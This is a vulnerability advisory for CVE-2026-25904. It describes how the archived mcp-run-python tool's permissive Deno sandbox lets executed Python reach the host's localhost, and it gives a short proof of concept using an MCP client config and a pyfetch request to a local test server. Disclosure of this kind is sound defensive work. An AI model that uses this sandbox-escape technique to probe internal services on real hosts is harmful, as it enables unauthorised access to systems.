---
description: CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF
title: mcp-run-python Deno SSRF
date_published: "2026-02-09"
last_updated: "2026-02-09"
xray_id: JFSA-2026-001653029
vul_id: CVE-2026-25904
cvss: 5.8
severity: medium
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

Overly permissive Deno configuration in mcp-run-python leads to SSRF

## Component

mcp-run-python

## Affected versions

(,)

## Description

The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.

## PoC

1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:

   ```json
   {
   "mcpServers": {
   "mcp-run-python":{
           "command": "uvx",
           "args": [
           "mcp-run-python",
           "stdio"
           ]
       }
     }
   }
   ```

2. Start a HTTP server listening to the localhost interface:

   ```bash
   python3 -m http.server -b 127.0.0.1 1234
   ```

3. Ask the MCP client to run this PoC code:

   ```python
   from pyodide.http import pyfetch
   response = await pyfetch("http://localhost:1234")
   data = await response.text()
   print(data)
   ```

4. View that the localhost server got a request from the tool



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References



